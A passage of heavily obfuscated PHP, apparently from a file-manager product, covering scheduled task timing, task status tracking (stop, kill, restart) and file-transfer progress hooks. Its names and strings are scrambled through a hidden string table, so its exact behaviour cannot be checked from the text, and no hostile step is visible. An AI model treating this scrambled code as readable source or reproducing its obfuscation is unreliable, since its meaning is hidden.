B‰ÛÀİçÊ; B‰ÛÀİçÊ: $a‹ÖÑ†‚ÃÃ = strtotime($DË¬ÑÕ”Å‚[1508] . $fº˜§“ Ì­[$DË¬ÑÕ”Å‚[1509]] . $DË¬ÑÕ”Å‚[1510]) - strtotime($DË¬ÑÕ”Å‚[1511]); $B¢ÒÏöÃØñ = time() - strtotime(date($DË¬ÑÕ”Å‚[1512]) . $DË¬ÑÕ”Å‚[1513]); $AİÑìª÷ = $B¢ÒÏöÃØñ >= $a‹ÖÑ†‚ÃÃ && $B¢ÒÏöÃØñ <= $a‹ÖÑ†‚ÃÃ + 3600; goto E»® Œºµ; E»® Œºµ: switch ($fº˜§“ Ì­[$DË¬ÑÕ”Å‚[29]]) { case $DË¬ÑÕ”Å‚[1514]: if (time() - $F¯éåÆµŸ < 3600 * 24 * 30) { return !1; } if ($fº˜§“ Ì­[$DË¬ÑÕ”Å‚[1514]] == date($DË¬ÑÕ”Å‚[1515]) && $AİÑìª÷) { return !0; } break; case $DË¬ÑÕ”Å‚[1516]: if (time() - $F¯éåÆµŸ < 3600 * 24 * 7) { return !1; } $c¼¬¯»õŠà = date($DË¬ÑÕ”Å‚[1517]) == 0 ? 7 : date($DË¬ÑÕ”Å‚[1517]); if ($fº˜§“ Ì­[$DË¬ÑÕ”Å‚[1516]] == $c¼¬¯»õŠà && $AİÑìª÷) { return !0; } break; case $DË¬ÑÕ”Å‚[1509]: if (time() - $F¯éåÆµŸ < 3600 * 24) { return !1; } if ($AİÑìª÷) { return !0; } break; case $DË¬ÑÕ”Å‚[1518]: if (time() - $F¯éåÆµŸ >= floatval($fº˜§“ Ì­[$DË¬ÑÕ”Å‚[1518]]) * 60) { return !0; } break; default: break; } return !1; goto aò”Ê…Ö˜º; aò”Ê…Ö˜º: } private static function closeDatabase() { goto FÄ•·„¦Ù­; bõğ¤¶Î™: $c–‡Ê¥øª¥ = Model($fçÑ‡’µÕ[511])->db($fçÑ‡’µÕ[33]); if ($c–‡Ê¥øª¥) { $c–‡Ê¥øª¥->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($fçÑ‡’µÕ[1519], $fçÑ‡’µÕ[1520]); die; } goto Fá¥Œù™‹; FÄ•·„¦Ù­: $fçÑ‡’µÕ =& $_SERVER[úÉ·öƒÑì©]; static $AŒ¢è¯¼„á = 0; $dî¥½®µº§ = 1800; goto Fß²Ÿ‹¯¤; Fß²Ÿ‹¯¤: if (!$AŒ¢è¯¼„á) { $AŒ¢è¯¼„á = time(); } if (time() - $AŒ¢è¯¼„á < $dî¥½®µº§) { return; } $AŒ¢è¯¼„á = time(); goto bõğ¤¶Î™; Fá¥Œù™‹: } public static function taskRun($b†íŒ’ÁÑ) { goto AÁÇï÷ñÏ«; fë…œ–×˜™: Model($C„”‡Üİø[1525])->add(array($C„”‡Üİø[1526] => $C„”‡Üİø[33], $C„”‡Üİø[1527] => $C„”‡Üİø[191], $C„”‡Üİø[29] => $C„”‡Üİø[1528] . $b†íŒ’ÁÑ[$C„”‡Üİø[402]], $C„”‡Üİø[1529] => json_encode(array($C„”‡Üİø[28] => $b†íŒ’ÁÑ[$C„”‡Üİø[28]], $C„”‡Üİø[1530] => timeFloat() - $BÖÈ†Ó•Â†, $C„”‡Üİø[300] => $eÎí¡áÈ)))); self::log($C„”‡Üİø[1531] . $b†íŒ’ÁÑ[$C„”‡Üİø[402]] . $C„”‡Üİø[1532] . $eÎí¡áÈ); return !0; goto C¯§Õ‘¯ª; aÊãôÁÁ¬: $BÖÈ†Ó•Â† = timeFloat(); $eÎí¡áÈ = $C„”‡Üİø[33]; switch ($b†íŒ’ÁÑ[$C„”‡Üİø[29]]) { case $C„”‡Üİø[314]: $Cœê×ğÚ°  = url_request($b†íŒ’ÁÑ[$C„”‡Üİø[1524]], $C„”‡Üİø[228], !1, !1, !1, !1, 5); $eÎí¡áÈ = strlen($Cœê×ğÚ° ); break; case $C„”‡Üİø[227]: $eÎí¡áÈ = Hook::apply($b†íŒ’ÁÑ[$C„”‡Üİø[1524]]); default: break; } goto fë…œ–×˜™; AÁÇï÷ñÏ«: $C„”‡Üİø =& $_SERVER[úÉ·öƒÑì©]; self::log($C„”‡Üİø[1521] . $b†íŒ’ÁÑ[$C„”‡Üİø[402]] . $C„”‡Üİø[1522] . $b†íŒ’ÁÑ[$C„”‡Üİø[28]] . $C„”‡Üİø[1523] . $b†íŒ’ÁÑ[$C„”‡Üİø[1524]]); Model($C„”‡Üİø[1505])->run($b†íŒ’ÁÑ[$C„”‡Üİø[402]]); goto aÊãôÁÁ¬; C¯§Õ‘¯ª: } private static function valueGet($cÕéì‰†³¦) { $Dù‡Ò´æà =& $_SERVER[úÉ·öƒÑì©]; $fîåóÆ¡õĞ = $Dù‡Ò´æà[1533]; $EŞ…Ş‚‰ˆ = Model($Dù‡Ò´æà[1534])->get($cÕéì‰†³¦, $fîåóÆ¡õĞ); if (is_null($EŞ…Ş‚‰ˆ)) { Model($Dù‡Ò´æà[1534])->set($Dù‡Ò´æà[726], $Dù‡Ò´æà[87], $fîåóÆ¡õĞ); Model($Dù‡Ò´æà[1534])->set($Dù‡Ò´æà[1499], $Dù‡Ò´æà[191], $fîåóÆ¡õĞ); $EŞ…Ş‚‰ˆ = Model($Dù‡Ò´æà[1534])->get($cÕéì‰†³¦, $fîåóÆ¡õĞ); } return $EŞ…Ş‚‰ˆ; } private static function valueSet($cÈ«’¡ƒ ¸, $Eß¾Ï‰¾çÚ) { $f£¬”·¨Ê™ =& $_SERVER[úÉ·öƒÑì©]; return Model($f£¬”·¨Ê™[1534])->set($cÈ«’¡ƒ ¸, $Eß¾Ï‰¾çÚ, $f£¬”·¨Ê™[1533]); } protected static function log($D¶Äù½‘÷“) { write_log($D¶Äù½‘÷“, $_SERVER[úÉ·öƒÑì©][1520]); } private static function cacheClear() { $b¨±××ƒ‡ =& $_SERVER[úÉ·öƒÑì©]; $DËÓËŠÔˆÎ = Model($b¨±××ƒ‡[1534])->cacheKey($b¨±××ƒ‡[1533]); Cache::clearMemory($DËÓËŠÔˆÎ); Model($b¨±××ƒ‡[1505])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\151\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($CéŞË¯Ÿ…„, $F£ºÄï¼ÌÉ = '', $a‚÷È°×İÉ = 0, $DÓŠ’ˆ‹ÀÕ = '') { goto Dò­Ş…õ„¯; Dò­Ş…õ„¯: $A³ÕŠ÷Ç¸Ğ =& $_SERVER[úÉ·öƒÑì©]; if (self::get($CéŞË¯Ÿ…„)) { return; } $this->task = array($A³ÕŠ÷Ç¸Ğ[402] => $CéŞË¯Ÿ…„, $A³ÕŠ÷Ç¸Ğ[1535] => USER_ID, $A³ÕŠ÷Ç¸Ğ[1441] => $DÓŠ’ˆ‹ÀÕ, $A³ÕŠ÷Ç¸Ğ[29] => $F£ºÄï¼ÌÉ, $A³ÕŠ÷Ç¸Ğ[1031] => $A³ÕŠ÷Ç¸Ğ[33], $A³ÕŠ÷Ç¸Ğ[1029] => $a‚÷È°×İÉ, $A³ÕŠ÷Ç¸Ğ[1044] => 0, $A³ÕŠ÷Ç¸Ğ[1536] => 0, $A³ÕŠ÷Ç¸Ğ[1537] => 0, $A³ÕŠ÷Ç¸Ğ[765] => timeFloat(), $A³ÕŠ÷Ç¸Ğ[764] => 0, $A³ÕŠ÷Ç¸Ğ[1538] => 0, $A³ÕŠ÷Ç¸Ğ[1539] => 0, $A³ÕŠ÷Ç¸Ğ[1540] => 0, $A³ÕŠ÷Ç¸Ğ[726] => $A³ÕŠ÷Ç¸Ğ[1499]); goto Dõâ‡Ÿòá÷; a»¬²Ä‹: $this->startAfter(); Hook::trigger($A³ÕŠ÷Ç¸Ğ[1545], $this->task); $this->task[$A³ÕŠ÷Ç¸Ğ[1538]] = timeFloat(); goto eãÊç¬‹·; Dõâ‡Ÿòá÷: $GLOBALS[$A³ÕŠ÷Ç¸Ğ[1541]] = 1; Hook::bind($A³ÕŠ÷Ç¸Ğ[1501], array($this, $A³ÕŠ÷Ç¸Ğ[1542])); Hook::bind($A³ÕŠ÷Ç¸Ğ[1543], array($this, $A³ÕŠ÷Ç¸Ğ[1544])); goto a»¬²Ä‹; eãÊç¬‹·: } public function end() { goto C‡Úƒ§œä; aêÔõÓİñ: Hook::unbind($F¦¿¤Ì…§¯[1543], array($this, $F¦¿¤Ì…§¯[1544])); $this->endAfter(); $this->task = !1; goto cõ…ì½Šè ; C‡Úƒ§œä: $F¦¿¤Ì…§¯ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->task) { return; } if ($this->task[$F¦¿¤Ì…§¯[1538]]) { self::valueSet($this->task[$F¦¿¤Ì…§¯[402]], !1); } goto A™í§©¿ŠÇ; A™í§©¿ŠÇ: $bÏ‰ùé¦Ÿ‡ = timeFloat() - $this->task[$F¦¿¤Ì…§¯[765]]; self::log($F¦¿¤Ì…§¯[1546] . $this->task[$F¦¿¤Ì…§¯[402]] . $F¦¿¤Ì…§¯[1547] . $bÏ‰ùé¦Ÿ‡ . $F¦¿¤Ì…§¯[1548]); Hook::unbind($F¦¿¤Ì…§¯[1501], array($this, $F¦¿¤Ì…§¯[1542])); goto aêÔõÓİñ; cõ…ì½Šè : } public function update($b£åñŠàÍ = 0, $a—ïÜ¹¡Å‹ = false) { goto C“¸Ú‡—…; C“¸Ú‡—…: $A¯Ò¡°¶šŞ =& $_SERVER[úÉ·öƒÑì©]; $B¢öâÑó’ =& $this->task; if (!$B¢öâÑó’) { return; } goto Cù£ŸîÚ×ã; Cù£ŸîÚ×ã: $B¢öâÑó’[$A¯Ò¡°¶šŞ[1044]] += $b£åñŠàÍ; $B¢öâÑó’[$A¯Ò¡°¶šŞ[764]] = timeFloat(); if ($B¢öâÑó’[$A¯Ò¡°¶šŞ[1029]]) { if ($B¢öâÑó’[$A¯Ò¡°¶šŞ[1029]] < $B¢öâÑó’[$A¯Ò¡°¶šŞ[1044]]) { $B¢öâÑó’[$A¯Ò¡°¶šŞ[1029]] = $B¢öâÑó’[$A¯Ò¡°¶šŞ[1044]]; } $AğÇÅÁƒĞ = timeFloat() - $B¢öâÑó’[$A¯Ò¡°¶šŞ[765]] - $B¢öâÑó’[$A¯Ò¡°¶šŞ[1539]]; $B¢öâÑó’[$A¯Ò¡°¶šŞ[1536]] = $B¢öâÑó’[$A¯Ò¡°¶šŞ[1044]] / $B¢öâÑó’[$A¯Ò¡°¶šŞ[1029]]; $B¢öâÑó’[$A¯Ò¡°¶šŞ[1537]] = $B¢öâÑó’[$A¯Ò¡°¶šŞ[1044]] / $AğÇÅÁƒĞ; if ($B¢öâÑó’[$A¯Ò¡°¶šŞ[1536]] > 0) { $B¢öâÑó’[$A¯Ò¡°¶šŞ[1540]] = $AğÇÅÁƒĞ * (1 - $B¢öâÑó’[$A¯Ò¡°¶šŞ[1536]]) / $B¢öâÑó’[$A¯Ò¡°¶šŞ[1536]]; } $B¢öâÑó’[$A¯Ò¡°¶šŞ[1540]] = $B¢öâÑó’[$A¯Ò¡°¶šŞ[1540]] <= 0 ? 0 : $B¢öâÑó’[$A¯Ò¡°¶šŞ[1540]]; } goto dêƒ‚®Ù×¹; F„×ñÑñÔò: $eÄº–µê = self::get($B¢öâÑó’[$A¯Ò¡°¶šŞ[402]]); $FŸæùâÊ”Ë = $eÄº–µê[$A¯Ò¡°¶šŞ[726]]; if ($FŸæùâÊ”Ë == self::STATYS_KILL) { $D™ŠÆÉ¬¤ = array($A¯Ò¡°¶šŞ[1549] => LNG($A¯Ò¡°¶šŞ[1550]), $A¯Ò¡°¶šŞ[1094] => !1); Cache::set($A¯Ò¡°¶šŞ[1551] . $this->task[$A¯Ò¡°¶šŞ[402]], $D™ŠÆÉ¬¤, 30); $this->onKill(); $this->end(); die; } else { if ($FŸæùâÊ”Ë == self::STATYS_STOP) { $bòªÚÎ‹÷¾ = 2; $eÄº–µê[$A¯Ò¡°¶šŞ[1539]] += $bòªÚÎ‹÷¾; self::valueSet($B¢öâÑó’[$A¯Ò¡°¶šŞ[402]], $eÄº–µê); sleep($bòªÚÎ‹÷¾); $this->update(); return; } } goto dªƒ‰¶éºÁ; dêƒ‚®Ù×¹: $this->updateAfter(); $CŒ¬¦—©°¼ = 0.2; if (timeFloat() - $B¢öâÑó’[$A¯Ò¡°¶šŞ[1538]] < $CŒ¬¦—©°¼ && !$a—ïÜ¹¡Å‹) { return; } goto F„×ñÑñÔò; dªƒ‰¶éºÁ: $B¢öâÑó’[$A¯Ò¡°¶šŞ[726]] = $FŸæùâÊ”Ë ? $FŸæùâÊ”Ë : $B¢öâÑó’[$A¯Ò¡°¶šŞ[726]]; $B¢öâÑó’[$A¯Ò¡°¶šŞ[1539]] = $eÄº–µê[$A¯Ò¡°¶šŞ[1539]] ? $eÄº–µê[$A¯Ò¡°¶šŞ[1539]] : 0; $B¢öâÑó’[$A¯Ò¡°¶šŞ[1538]] = timeFloat(); goto d˜’âˆÁ©Ñ; d˜’âˆÁ©Ñ: Hook::trigger($A¯Ò¡°¶šŞ[1552], $B¢öâÑó’); self::valueSet($B¢öâÑó’[$A¯Ò¡°¶šŞ[402]], $B¢öâÑó’); goto dÅìÎÀÓ¾÷; dÅìÎÀÓ¾÷: } public function onKillSet($bßõ™ñ‚«Õ, $f¢ˆ¹²ÒÖø = array()) { $this->onKillCall = array($bßõ™ñ‚«Õ, $f¢ˆ¹²ÒÖø); } public function onKill() { $AÂøøó¶â =& $_SERVER[úÉ·öƒÑì©]; self::log($AÂøøó¶â[1546] . $this->task[$AÂøøó¶â[402]] . $AÂøøó¶â[1553]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($b›Ğª´Óéæ) { $fïÍ÷Øƒª =& $_SERVER[úÉ·öƒÑì©]; Cache::set($fïÍ÷Øƒª[1551] . $this->task[$fïÍ÷Øƒª[402]], $b›Ğª´Óéæ, 60); return $b›Ğª´Óéæ; } public static function get($c²Û¶­•Èª) { return self::valueGet($c²Û¶­•Èª); } public static function listData() { $dÃõÒĞÒŠ£ = self::valueGet(); return array_sort_by($dÃõÒĞÒŠ£, $_SERVER[úÉ·öƒÑì©][765], !0); } public static function kill($D¬Ã¸İ„ö) { return self::changeStatus($D¬Ã¸İ„ö, self::STATYS_KILL); } public static function stop($B‘ÚÀ‡…×ù) { return self::changeStatus($B‘ÚÀ‡…×ù, self::STATYS_STOP); } public static function restart($f²Âˆåíæ…) { return self::changeStatus($f²Âˆåíæ…, self::STATYS_RUNNING); } public static function killAll() { $Eëõ÷è’£ƒ =& $_SERVER[úÉ·öƒÑì©]; $c”‡÷‘‘Ò½ = self::listData(); foreach ($c”‡÷‘‘Ò½ as $fç¬”®Ç½˜) { self::kill($fç¬”®Ç½˜[$Eëõ÷è’£ƒ[402]]); } sleep(2); foreach ($c”‡÷‘‘Ò½ as $fç¬”®Ç½˜) { self::valueSet($fç¬”®Ç½˜[$Eëõ÷è’£ƒ[402]], !1); } } private static function changeStatus($fƒ´ùãÙ—ë, $cÌÀä¿à) { goto fìµÍ¡œ¬ç; fìµÍ¡œ¬ç: $D·ğî‚Šá =& $_SERVER[úÉ·öƒÑì©]; $e†ÕŞÂŒî = self::valueGet($fƒ´ùãÙ—ë); if (!$e†ÕŞÂŒî) { return !1; } goto cŠŒ©•›áĞ; b®®Æƒ¬•: return !0; goto C©åÅßæÄ­; cŠŒ©•›áĞ: $e†ÕŞÂŒî[$D·ğî‚Šá[726]] = $cÌÀä¿à; self::valueSet($fƒ´ùãÙ—ë, $e†ÕŞÂŒî); self::log($D·ğî‚Šá[1554] . $e†ÕŞÂŒî[$D·ğî‚Šá[402]] . $D·ğî‚Šá[1555] . $cÌÀä¿à); goto b®®Æƒ¬•; C©åÅßæÄ­: } public static function valueGet($eÛ­„ŒÚ = false) { $EÙ¢é×òš‘ =& $_SERVER[úÉ·öƒÑì©]; if ($eÛ­„ŒÚ) { $Bõ¶ò•‡‘ = Model($EÙ¢é×òš‘[434])->where(array($EÙ¢é×òš‘[93] => $eÛ­„ŒÚ, $EÙ¢é×òš‘[29] => $EÙ¢é×òš‘[1556]))->find(); return $Bõ¶ò•‡‘ ? json_decode($Bõ¶ò•‡‘[$EÙ¢é×òš‘[381]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eä˜Ã½±‰¨ = false) { goto A­Ö…Û¹Í; f†ç¹‘É‰À: $f…áñçÉ‹Ú = Model($B¦·Ş¤”ª¦[434])->where($cƒ‰ñÂÄÒò)->select(); $f…áñçÉ‹Ú = $f…áñçÉ‹Ú ? $f…áñçÉ‹Ú : array(); foreach ($f…áñçÉ‹Ú as $B»øèÒ„¶ => $B¶ÀíæÓÕ) { $f…áñçÉ‹Ú[$B»øèÒ„¶] = json_decode($B¶ÀíæÓÕ[$B¦·Ş¤”ª¦[381]], !0); } goto BùÈÔ½İö®; A­Ö…Û¹Í: $B¦·Ş¤”ª¦ =& $_SERVER[úÉ·öƒÑì©]; $cƒ‰ñÂÄÒò = array($B¦·Ş¤”ª¦[29] => $B¦·Ş¤”ª¦[1556]); if ($eä˜Ã½±‰¨) { $cƒ‰ñÂÄÒò[$B¦·Ş¤”ª¦[1535]] = $eä˜Ã½±‰¨; } goto f†ç¹‘É‰À; BùÈÔ½İö®: return $f…áñçÉ‹Ú; goto Bóìãóñ‹í; Bóìãóñ‹í: } public static function valueSet($aÈŒÓä†­, $c¶‘¥×àÃî) { goto A“…„äã¿ò; aÉ“Û¾•ù†: if (!$AçäÈÂ¹ò) { ob_start(); var_dump($c¶‘¥×àÃî); $eºŠæ±¨ÈÕ = ob_get_clean(); self::log($CÅïª¥ì[1557] . json_encode_force($eºŠæ±¨ÈÕ)); } if (!$aÈŒÓä†­ || !$c¶‘¥×àÃî[$CÅïª¥ì[402]]) { return !1; } $b–±ŞÄªà = array($CÅïª¥ì[29] => $CÅïª¥ì[1556], $CÅïª¥ì[1535] => USER_ID, $CÅïª¥ì[93] => $aÈŒÓä†­, $CÅïª¥ì[381] => $AçäÈÂ¹ò); goto e£›— ¬ùê; A“…„äã¿ò: $CÅïª¥ì =& $_SERVER[úÉ·öƒÑì©]; if (!$c¶‘¥×àÃî) { return Model($CÅïª¥ì[434])->where(array($CÅïª¥ì[93] => $aÈŒÓä†­, $CÅïª¥ì[29] => $CÅïª¥ì[1556]))->delete(); } $AçäÈÂ¹ò = json_encode($c¶‘¥×àÃî); goto aÉ“Û¾•ù†; e£›— ¬ùê: Model($CÅïª¥ì[434])->add($b–±ŞÄªà, array(), !0); goto E‚‹Ë²î»‰; E‚‹Ë²î»‰: } public static function log($b‡ÑˆŞ·Œä) { if (!GLOBAL_DEBUG) { return; } write_log($b‡ÑˆŞ·Œä, $_SERVER[úÉ·öƒÑì©][1558]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto a¥Ö…®É½”; C¾ƒ—ÚÈ÷: $DƒÅó—ÑãŸ[$Dì³¥²º–[1031]] = $Dì³¥²º–[33]; $DƒÅó—ÑãŸ[$Dì³¥²º–[1581]] = $Dì³¥²º–[33]; $DƒÅó—ÑãŸ[$Dì³¥²º–[1582]] = 0; goto bê‹²±™œ; bê‹²±™œ: $DƒÅó—ÑãŸ[$Dì³¥²º–[1583]] = 0; $DƒÅó—ÑãŸ[$Dì³¥²º–[1584]] = 0; if (!$DƒÅó—ÑãŸ[$Dì³¥²º–[1441]]) { $DƒÅó—ÑãŸ[$Dì³¥²º–[1441]] = LNG($Dì³¥²º–[1585]); } goto fùòË‰…èŞ; féŒ«´Ô´: Hook::bind($Dì³¥²º–[579], array($this, $Dì³¥²º–[1566])); Hook::bind($Dì³¥²º–[546], array($this, $Dì³¥²º–[1567])); Hook::bind($Dì³¥²º–[543], array($this, $Dì³¥²º–[1567])); goto F¡‹Ï„ Ê; a¥Ö…®É½”: $Dì³¥²º– =& $_SERVER[úÉ·öƒÑì©]; $DƒÅó—ÑãŸ =& $this->task; $this->sourceCopyFolder = !1; goto FÂ¡à“Á‹Á; FÂ¡à“Á‹Á: Hook::bind($Dì³¥²º–[1559], array($this, $Dì³¥²º–[1560])); Hook::bind($Dì³¥²º–[1118], array($this, $Dì³¥²º–[1561])); Hook::bind($Dì³¥²º–[1562], array($this, $Dì³¥²º–[1563])); goto EÍïêÜ¢¡¢; F¡‹Ï„ Ê: Hook::bind($Dì³¥²º–[548], array($this, $Dì³¥²º–[1567])); Hook::bind($Dì³¥²º–[550], array($this, $Dì³¥²º–[1567])); Hook::bind($Dì³¥²º–[552], array($this, $Dì³¥²º–[1567])); goto d¡Çì¤ñ´’; fÊÅ›·¿: $DƒÅó—ÑãŸ[$Dì³¥²º–[1577]] = LNG($Dì³¥²º–[1578]); $DƒÅó—ÑãŸ[$Dì³¥²º–[1579]] = 0; $DƒÅó—ÑãŸ[$Dì³¥²º–[1580]] = 0; goto C¾ƒ—ÚÈ÷; d¡Çì¤ñ´’: Hook::bind($Dì³¥²º–[1568], array($this, $Dì³¥²º–[1569])); Hook::bind($Dì³¥²º–[568], array($this, $Dì³¥²º–[1570])); $this->sourceModelCopyFlag = !1; goto AÁÉÀî•²“; EÍïêÜ¢¡¢: Hook::bind($Dì³¥²º–[575], array($this, $Dì³¥²º–[1564])); Hook::bind($Dì³¥²º–[576], array($this, $Dì³¥²º–[1565])); Hook::bind($Dì³¥²º–[578], array($this, $Dì³¥²º–[1566])); goto féŒ«´Ô´; AÁÉÀî•²“: Hook::bind($Dì³¥²º–[1571], array($this, $Dì³¥²º–[1572])); Hook::bind($Dì³¥²º–[1573], array($this, $Dì³¥²º–[1574])); Hook::bind($Dì³¥²º–[1575], array($this, $Dì³¥²º–[1576])); goto fÊÅ›·¿; fùòË‰…èŞ: } protected function endAfter() { goto dÜÏõÑÅ†Õ; eî„†í†Ì¸: Hook::unbind($F®¼è“®Šƒ[552], array($this, $F®¼è“®Šƒ[1567])); Hook::unbind($F®¼è“®Šƒ[1568], array($this, $F®¼è“®Šƒ[1569])); Hook::unbind($F®¼è“®Šƒ[568], array($this, $F®¼è“®Šƒ[1570])); goto E¼„Áæ÷¤‚; E¼„Áæ÷¤‚: Hook::unbind($F®¼è“®Šƒ[1571], array($this, $F®¼è“®Šƒ[1572])); Hook::unbind($F®¼è“®Šƒ[1573], array($this, $F®¼è“®Šƒ[1574])); Hook::unbind($F®¼è“®Šƒ[1575], array($this, $F®¼è“®Šƒ[1576])); goto f ÓòÁ«; DÂç§½Àš¾: Hook::unbind($F®¼è“®Šƒ[1562], array($this, $F®¼è“®Šƒ[1563])); Hook::unbind($F®¼è“®Šƒ[575], array($this, $F®¼è“®Šƒ[1564])); Hook::unbind($F®¼è“®Šƒ[576], array($this, $F®¼è“®Šƒ[1565])); goto EèõÖ‡ï•µ; dÜÏõÑÅ†Õ: $F®¼è“®Šƒ =& $_SERVER[úÉ·öƒÑì©]; Hook::unbind($F®¼è“®Šƒ[1559], array($this, $F®¼è“®Šƒ[1560])); Hook::unbind($F®¼è“®Šƒ[1118], array($this, $F®¼è“®Šƒ[1561])); goto DÂç§½Àš¾; e„Š™Ş¾·ƒ: Hook::unbind($F®¼è“®Šƒ[543], array($this, $F®¼è“®Šƒ[1567])); Hook::unbind($F®¼è“®Šƒ[548], array($this, $F®¼è“®Šƒ[1567])); Hook::unbind($F®¼è“®Šƒ[550], array($this, $F®¼è“®Šƒ[1567])); goto eî„†í†Ì¸; EèõÖ‡ï•µ: Hook::unbind($F®¼è“®Šƒ[578], array($this, $F®¼è“®Šƒ[1566])); Hook::unbind($F®¼è“®Šƒ[579], array($this, $F®¼è“®Šƒ[1566])); Hook::unbind($F®¼è“®Šƒ[546], array($this, $F®¼è“®Šƒ[1567])); goto e„Š™Ş¾·ƒ; f ÓòÁ«: } public function copyMoveStart($B¼Ôí³Ù¥, $Eº˜—óª°, $DÙéçˆïÃÈ, $bß†­œ¿â°) { goto D‡À‰„«Šç; FÅ°ÊŠ¼†: if (substr($Eº˜—óª°, 0, strlen($FàÈÒó‚)) == $FàÈÒó‚) { return; } if (substr($bß†­œ¿â°, 0, strlen($FàÈÒó‚)) == $FàÈÒó‚) { return; } $eºÁæƒñó– =& $this->task; goto EçÆĞ¬ğÙ; EçÆĞ¬ğÙ: $eºÁæƒñó–[$bË¦ä¢Ô¡[1587]] = KodIO::transferType($B¼Ôí³Ù¥, $DÙéçˆïÃÈ); $this->update(); goto cÊåøŸ˜¨‰; D‡À‰„«Šç: $bË¦ä¢Ô¡ =& $_SERVER[úÉ·öƒÑì©]; self::log($bË¦ä¢Ô¡[1586] . $Eº˜—óª° . $bË¦ä¢Ô¡[67] . $bß†­œ¿â°); $FàÈÒó‚ = rtrim(TEMP_FILES, $bË¦ä¢Ô¡[8]); goto FÅ°ÊŠ¼†; cÊåøŸ˜¨‰: } public function updateAfter() { goto C‚¤†íâŠ; C‚¤†íâŠ: $f©ßĞŠ‘¶Æ =& $_SERVER[úÉ·öƒÑì©]; $E·ÜÀØˆ =& $this->task; if (!$E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[739]]) { return; } goto Fà‘ÃÚÃ; EÖ×·éµ¦ö: $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1536]] = $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1584]] / $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[739]]; if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1536]] > 0) { $B‡¬ØÄØ¡§ = timeFloat() - $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[765]] - $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1539]]; $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1540]] = $B‡¬ØÄØ¡§ * (1 - $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1536]]) / $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1536]]; } goto E˜ª‡Ÿ–Œ´; Fà‘ÃÚÃ: if ($this->sourceModelCopyFlag) { return; } if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1587]] == $f©ßĞŠ‘¶Æ[1190]) { return; } if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1587]] == $f©ßĞŠ‘¶Æ[1102] || $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1587]] == $f©ßĞŠ‘¶Æ[107]) { if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1581]]) { $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1584]] = $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1583]] + $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1580]]; } } else { if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1587]] == $f©ßĞŠ‘¶Æ[1191]) { if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1581]] == $f©ßĞŠ‘¶Æ[1102]) { $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1584]] = $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1583]] + $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1580]] * 0.5; } else { if ($E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1581]] == $f©ßĞŠ‘¶Æ[107]) { $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1584]] = $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1583]] + $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1579]] * 0.5 + $E·ÜÀØˆ[$f©ßĞŠ‘¶Æ[1580]] * 0.5; } } } } goto EÖ×·éµ¦ö; E˜ª‡Ÿ–Œ´: } public function addPath($DÔªŒ±šğ›) { goto A•í»óğƒ; Dİ¯»ø¶Ó: if ($c¢‹Š•‹À[$D§áÏˆµÀñ[29]] == $D§áÏˆµÀñ[193]) { $d±İ’‰â[$D§áÏˆµÀñ[1029]] += 1; } else { $d±İ’‰â[$D§áÏˆµÀñ[1029]] += $c¢‹Š•‹À[$D§áÏˆµÀñ[81]][$D§áÏˆµÀñ[79]]; if ($c¢‹Š•‹À[$D§áÏˆµÀñ[404]]) { $d±İ’‰â[$D§áÏˆµÀñ[1029]] += $c¢‹Š•‹À[$D§áÏˆµÀñ[81]][$D§áÏˆµÀñ[80]] + 1; } } $d±İ’‰â[$D§áÏˆµÀñ[739]] += $c¢‹Š•‹À[$D§áÏˆµÀñ[78]]; $this->update(); goto D’¯Àè«…Å; A•í»óğƒ: $D§áÏˆµÀñ =& $_SERVER[úÉ·öƒÑì©]; if (!$DÔªŒ±šğ›) { return; } $d±İ’‰â =& $this->task; goto FáÀº°±“é; FáÀº°±“é: $c¢‹Š•‹À = IO::infoWithChildren($DÔªŒ±šğ›); $AÈîÜèÓâ = $d±İ’‰â[$D§áÏˆµÀñ[1588]] ? $d±İ’‰â[$D§áÏˆµÀñ[1588]][$D§áÏˆµÀñ[1589]] : 0; $d±İ’‰â[$D§áÏˆµÀñ[1588]] = array($D§áÏˆµÀñ[1589] => $AÈîÜèÓâ + 1, $D§áÏˆµÀñ[422] => $c¢‹Š•‹À[$D§áÏˆµÀñ[28]], $D§áÏˆµÀñ[76] => $c¢‹Š•‹À[$D§áÏˆµÀñ[76]], $D§áÏˆµÀñ[504] => $c¢‹Š•‹À[$D§áÏˆµÀñ[504]] ? $c¢‹Š•‹À[$D§áÏˆµÀñ[504]] : $c¢‹Š•‹À[$D§áÏˆµÀñ[76]]); goto Dİ¯»ø¶Ó; D’¯Àè«…Å: 